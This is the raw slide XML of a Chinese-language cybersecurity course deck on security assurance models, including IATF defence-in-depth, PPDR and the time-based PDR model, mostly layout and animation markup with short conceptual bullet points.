        <p:spPr>
          <a:xfrm>
            <a:off x="1109958" y="3834281"/>
            <a:ext cx="7272808" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="0033CC"/>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686117" y="3228816"/>
            <a:ext cx="1569660" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>攻击后的修复</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="直接连接符 15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1043608" y="4941168"/>
            <a:ext cx="7272808" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="0033CC"/>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3054174" y="4114180"/>
            <a:ext cx="1800493" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>防止攻击的发生</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="矩形 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5358430" y="3904569"/>
            <a:ext cx="3024336" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>始终能保证维持特定水平的</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>可用性、完整性、真实性、机密性和抗抵赖性</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="矩形 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1318272" y="3254238"/>
            <a:ext cx="841897" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>关   注</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="矩形 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1342662" y="4113130"/>
            <a:ext cx="841897" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>目   的</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395536" y="853405"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>与信息安全、安全保障的区别</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19156036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p:cTn id="41" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="43" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18"/>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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="46" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="4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3" grpId="0"/>
      <p:bldP spid="15" grpId="0"/>
      <p:bldP spid="17" grpId="0"/>
      <p:bldP spid="18" grpId="0"/>
      <p:bldP spid="19" grpId="0"/>
      <p:bldP spid="2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a:xfrm>
            <a:off x="611560" y="764704"/>
            <a:ext cx="7416800" cy="4873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zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全保障概念与模型</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66563" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="417284" y="1628801"/>
            <a:ext cx="8424936" cy="648072"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>知识子域：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>安全保障相关模型</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="564184" y="3717032"/>
            <a:ext cx="8156389" cy="1569660"/>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zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>理解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>的深度防御思想，及其将信息系统在技术层面的防御划分为本地计算环境、区域边界、网络基础设施和支撑性基础设施四个方面，理解每一方面的安全需求及基本实现方法</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="564184" y="2426112"/>
            <a:ext cx="7896247" cy="1200329"/>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zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>理解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>模型的基本原理：策略、防护、检测及响应，以及</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>公式所表达的安全目标理解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>数学公式所表达的安全目标</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">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4525252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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="665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5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P spid="3"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type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="1499292"/>
            <a:ext cx="7488832" cy="223224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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>什么是网络空间安全模型</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>通过建模的思想来解决网络安全管理问题，有效抵御外部攻击，保障网络安全。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>安全模型用于精确和形式地描述信息系统的安全特征，解释系统安全相关行为。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67589" name="标题 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934244" y="747725"/>
            <a:ext cx="6513512" cy="4873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zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全模型的概念</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="577652" y="3573016"/>
            <a:ext cx="7378724" cy="1446550"/>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solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>为什么需要安全模型</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRP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能准确地描述安全的重要方面与系统行为的关系。</a:t>
            </a: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能提高对成功实现关键安全需求的理解层次。</a:t>
            </a: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从中开发出一套安全性评估准则，和关键的描述变量。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2254372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586">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6758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58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7586">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6758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758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7586">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6758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758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build="p"/>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noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="1508282"/>
            <a:ext cx="7488832" cy="864096"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>思想：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>承认漏洞，正视威胁，适度防护，加强检测，落实反应，建立威慑</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73731" name="标题 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="847043"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>基于时间的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73732"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391B2BCD-48E9-47A8-B325-0164A6187CB6}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>32</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="859590" y="4381947"/>
            <a:ext cx="6696744" cy="461665"/>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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>缺点：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>难于适应网络安全环境的快速变化</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="2409897"/>
            <a:ext cx="7704856" cy="461665"/>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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>出发点：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>任何防护措施都是基于时间的，是可以被攻破的</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="859590" y="2996952"/>
            <a:ext cx="4572000" cy="1384995"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>核心与本质：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>给出攻防时间表</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>固定防守、测试攻击时间；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>固定攻击手法，测试防守时间</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26900066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730">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7373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73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arn(inVertical)">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build="p"/>
      <p:bldP spid="2" grpId="0"/>
      <p:bldP spid="3"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3331" y="2492896"/>
            <a:ext cx="3024336" cy="2764432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="直接箭头连接符 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4577547" y="2204864"/>
            <a:ext cx="792088" cy="432048"/>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369635" y="1244649"/>
            <a:ext cx="3456384" cy="1846659"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>保护（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Protection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
